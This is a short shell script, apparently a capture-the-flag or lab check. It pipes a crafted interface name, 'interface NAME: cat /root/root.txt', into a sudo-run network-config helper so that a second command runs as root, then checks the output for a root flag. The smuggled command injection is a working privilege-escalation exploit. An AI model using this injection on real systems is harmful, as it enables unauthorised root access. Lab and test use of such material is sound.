set -eu
out=$(printf 'interface NAME: cat /root/root.txt\n' | sudo -n /usr/local/sbin/changename.sh 2>&1)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "ifcfg helper did not give root" >&2; exit 1; }
